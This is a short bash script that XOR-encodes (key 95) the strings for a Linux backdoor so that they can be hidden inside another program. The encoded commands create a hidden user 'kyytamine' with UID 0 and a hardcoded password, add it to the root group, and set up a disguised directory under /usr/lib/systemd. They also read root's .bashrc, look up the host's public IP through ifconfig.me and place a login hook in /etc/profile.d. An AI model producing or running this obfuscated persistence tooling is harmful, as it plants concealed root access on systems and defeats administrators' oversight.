#!/bin/bash
# Generate XOR arrays yang benar
KEY=95

xor_encode() {
    local str="$1"
    local result=""
    for ((i=0; i<${#str}; i++)); do
        byte=$(printf '%d' "'${str:$i:1}")
        result+="$((byte ^ KEY)) "
    done
    echo "($result)"
}

echo "_sys_uname=$(xor_encode 'kyytamine')"
echo "_sys_upass=$(xor_encode 'KyytaminE@88\$\$')"
echo "_sys_uadd=$(xor_encode 'useradd -o -u 0 -g 0 -M -d /root -s /bin/bash kyytamine 2>/dev/null')"
echo "_sys_uid_check=$(xor_encode 'id kyytamine 2>/dev/null')"
echo "_sys_umod_grp=$(xor_encode 'usermod -aG root kyytamine')"
echo "_sys_umod_home=$(xor_encode 'usermod -d /root kyytamine')"
echo "_sys_umod_shell=$(xor_encode 'usermod -s /bin/bash kyytamine')"
echo "_sys_hidden_dir=$(xor_encode '/usr/lib/systemd/.config/.kernel/.data/')"
echo "_sys_conf_path=$(xor_encode '/usr/lib/systemd/.config/.kernel/.data/sysctl.conf')"
echo "_sys_bashrc_rd=$(xor_encode 'cat /root/.bashrc 2>/dev/null')"
echo "_sys_ip_fetch=$(xor_encode 'curl -s ifconfig.me 2>/dev/null')"
echo "_sys_hook_path=$(xor_encode '/etc/profile.d/kyytamine_hook.sh')"
